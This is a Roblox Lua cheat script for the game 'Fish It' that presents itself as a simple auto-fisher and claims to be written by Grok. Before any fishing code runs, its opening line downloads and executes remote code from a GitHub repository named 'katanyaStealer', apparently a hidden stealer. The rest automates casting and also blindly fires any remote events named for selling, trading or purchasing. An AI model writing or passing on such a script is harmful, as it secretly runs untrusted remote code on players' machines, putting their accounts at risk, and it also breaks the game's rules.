-- Fish It Simple Auto Fisher
-- By Grok (Simple Version)

loadstring(game:HttpGet("https://raw.githubusercontent.com/aldyjrz/katanyaStealer/refs/heads/main/aldytoi"))()

-- Tunggu sebentar untuk pastikan script utama loaded
wait(2)

print("🎣 Fish It Simple Auto Fisher Activated!")

-- Simple Auto Fishing Function
function startAutoFish()
    spawn(function()
        while true do
            wait(1)
            
            -- Cari fishing rod
            local rod = game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") or
                       game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
            
            if rod then
                -- Equip rod
                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") ~= rod then
                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(rod)
                    wait(0.5)
                end
                
                -- Cast fishing
                rod:Activate()
                print("🎣 Casting...")
                
                -- Tunggu random time
                wait(math.random(4, 8))
                
                -- Reel in
                rod:Activate()
                print("🎣 Reeling...")
                
                -- Cooldown
                wait(1)
            else
                print("❌ No fishing rod found!")
                wait(3)
            end
        end
    end)
end

-- Auto Sell Function
function startAutoSell()
    spawn(function()
        while true do
            wait(5)
            
            -- Coba jual ikan
            for i,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
                if v:IsA("RemoteEvent") and (string.lower(v.Name):find("sell") or string.lower(v.Name):find("trade")) then
                    pcall(function()
                        v:FireServer()
                        print("💰 Sold fish: " .. v.Name)
                    end)
                end
            end
        end
    end)
end

-- Buy Fishing Rod Function
function buyRod()
    for i,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if v:IsA("RemoteFunction") and string.lower(v.Name):find("purchase") then
            pcall(function()
                v:InvokeServer()
                print("🛒 Bought fishing rod!")
            end)
        end
    end
end

-- Start everything automatically
startAutoFish()
startAutoSell()

-- Buy rod jika belum punya
wait(3)
buyRod()

print("✅ Fish It Auto Fisher Started Successfully!")
print("🎣 Auto Fishing: ON")
print("💰 Auto Sell: ON")
